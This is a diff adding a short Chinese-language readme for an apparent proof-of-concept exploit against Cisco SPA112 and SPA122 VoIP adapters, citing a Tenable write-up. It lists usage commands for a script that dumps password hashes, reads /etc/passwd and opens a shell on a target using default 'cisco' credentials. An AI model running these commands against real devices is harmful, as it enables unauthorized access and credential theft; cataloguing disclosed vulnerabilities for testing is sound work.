@@ -1,0 +1,7 @@
+验证方式：验证文章
+文章链接：https://medium.com/tenable-techblog/rce-in-cisco-voip-adapters-115784b6d32b
+目标产品：SPA112和SPA122
+poc用法：
+	 $ python3 spagett.py --attack hashes 192.168.3.13 cisco cisco
+                  $ python3 spagett.py --attack readfile --file /etc/passwd 192.168.3.13 cisco cisco
+                  $ python3 spagett.py --attack shell 192.168.3.13 cisco cisco
